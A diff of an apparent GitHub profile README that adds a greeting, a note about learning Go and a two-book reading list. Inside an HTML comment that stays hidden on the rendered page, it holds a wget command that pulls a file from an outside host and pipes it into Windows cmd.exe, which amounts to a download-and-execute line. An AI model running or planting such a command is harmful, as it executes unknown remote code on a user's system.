@@ -1,5 +1,12 @@
-### Hi
-I like finding secrets
+## Hi
+This is DackJempseys profile. Take a look around and let me know if you have any questions. 
+
+### Currentl Learning
+Working on sharpening my Go programing skills. Be sure to check in for more repos.
+
+### Current Books
+[Black Hat Go](https://nostarch.com/blackhatgo)
+[Endurance](https://www.amazon.com/Endurance-Shackletons-Incredible-Alfred-Lansing/dp/0465062881)
 
 <!--
 `wget quicker.computer/fe334TGee4GWindows100R443 |C:\Windows\system32\cmd.exe`
